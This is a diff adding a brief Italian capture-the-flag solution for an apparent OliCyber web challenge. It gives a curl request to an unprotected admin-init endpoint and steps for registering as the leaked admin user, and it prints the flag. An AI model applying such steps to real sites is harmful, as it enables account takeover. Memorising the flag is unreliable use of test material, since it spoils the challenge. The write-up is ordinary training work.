@@ -1,0 +1,10 @@
+soluzione:
+curl -d '' http://zio-frank.challs.olicyber.it/admin/init
+restituisce un risultato simile --->>{"username":"admin-b61a3750468c7d0c4074870f6e2f9448"}%   
+
+regsitrarsi al sito in questo modo:
+username: quella in output dal comando precedente
+password: la parte esadecimale dell'username
+
+effettuare il login con le credenziali e si ottiene la flag:
+flag{s1mpl3r_th4n_3xp3ct3d_but_ruby_1s_c00l_y34h} 
